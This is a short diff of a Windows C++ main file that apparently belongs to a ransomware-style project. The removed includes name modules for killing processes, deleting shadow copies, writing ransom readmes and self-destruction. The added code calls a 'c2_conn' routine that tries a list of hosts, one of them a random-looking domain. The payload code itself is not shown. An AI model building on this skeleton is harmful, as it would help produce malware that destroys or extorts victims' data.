@@ -1,31 +1,18 @@
-#include <iostream>
 #include <Windows.h>
-#include "gen_uid.h"
-#include "kill_procs.h"
-#include "gen_str.h"
-#include "del_shadows.h"
-#include "msg_screen.h"
-#include "create_readmes.h"
-#include "self_dest.h"
-#include "system_id.h"
-#include "profiler.h"
-#include "merge_dics.h"
-#include "google_conn.h"
+#include <iostream>
+#include "c2_conn.h"
 
 #pragma comment(lib, "iphlpapi.lib")
 
-/*
-int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
-    return ShowFullScreenWindow(hInstance, nCmdShow);
-}
-*/
 
 int main() {
-    if (googleConn()) {
-        std::cout << "Connected to Google" << std::endl;
+    std::vector<std::string> urls = { "www.hfsjkdfgsjhserk.com", "www.google.com", "www.example.com" };
+    std::string connectedWebsite = c2_conn(urls);
+    if (!connectedWebsite.empty()) {
+        std::cout << "Connected to " << connectedWebsite << std::endl;
     }
     else {
-        std::cerr << "Unable to connect to Google" << std::endl;
+        std::cerr << "Unable to connect to any website" << std::endl;
     }
 
     return 0;
